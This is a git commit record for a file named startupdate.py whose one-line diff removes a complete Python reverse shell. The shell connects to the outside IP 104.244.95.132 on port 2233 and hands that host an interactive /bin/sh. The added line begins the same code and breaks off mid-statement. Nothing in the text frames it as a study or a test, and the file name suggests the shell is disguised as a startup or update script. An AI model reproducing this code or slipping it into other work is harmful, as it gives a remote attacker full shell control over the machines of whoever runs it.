30776a2bb594f5184642de08831d35b37fae8963
Elysiawps <142763584+Elysiawps@users.noreply.github.com>
2023-08-21 15:54:47 +0800

    Update startupdate.py

--- startupdate.py
+++ startupdate.py
@@ -1,1 +1,1 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("104.244.95.132",2233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+import socket,subprocess,os;s=socket.socket(socket.A
